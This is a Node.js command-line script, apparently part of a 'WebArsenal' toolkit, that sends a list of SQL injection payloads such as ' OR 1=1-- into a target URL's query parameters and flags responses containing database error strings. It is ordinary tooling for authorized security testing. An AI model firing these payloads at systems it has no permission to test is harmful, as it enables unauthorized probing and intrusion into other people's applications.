#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: sqli-fuzzer.js                                     ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('sqli-fuzzer.js')
  .description('Tests for SQL Injection vulnerabilities using error-based and boolean payloads.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?id=1)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .option('-v, --verbose', 'Show all attempts')
  .parse(process.argv);

const opts = program.opts();

const SQLI_PAYLOADS = [
  "'", "''", "\"", "\"\"", "`", "`)", "'))", ";", "--", "#", "/*", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
  "admin'--", "admin' #", "' OR TRUE--", "' OR 'x'='x", ") OR 1=1--"
];

const ERROR_SIGNATURES = [
  "SQL syntax", "mysql_fetch_array", "ora-01756", "SQLite.Exception", "PostgreSQL query failed",
  "XPathException", "Sybse message", "Microsoft OLE DB Provider", "Unclosed quotation mark"
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'sqli-fuzzer.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found to fuzz. Use -u <url?id=1>'));
    return;
  }
  
  console.log(chalk.cyan(`[*] Fuzzing ${params.length} parameters for SQLi...\n`));
  
  for (const param of params) {
    console.log(chalk.bold.white(`[→] Testing Parameter: ${param}`));
    
    for (const payload of SQLI_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        if (opts.verbose) process.stdout.write(chalk.gray(`  - Payload [${payload}]: `));
        
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        const foundError = ERROR_SIGNATURES.find(sig => body.includes(sig));
        
        if (foundError) {
          console.log(chalk.bold.red(`\n[!] VULNERABILITY DETECTED! [${param}]`));
          console.log(chalk.red(`    Error Signature: ${foundError}`));
          console.log(chalk.red(`    URL: ${testUrl.href}\n`));
          break;
        } else if (opts.verbose) {
          process.stdout.write(chalk.green('OK\n'));
        }
      } catch (err) {
        if (opts.verbose) console.log(chalk.yellow(`TIMEOUT/ERROR: ${err.message}`));
      }
    }
  }
  
  console.log(chalk.cyan('\n[*] Fuzzing complete.'));
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
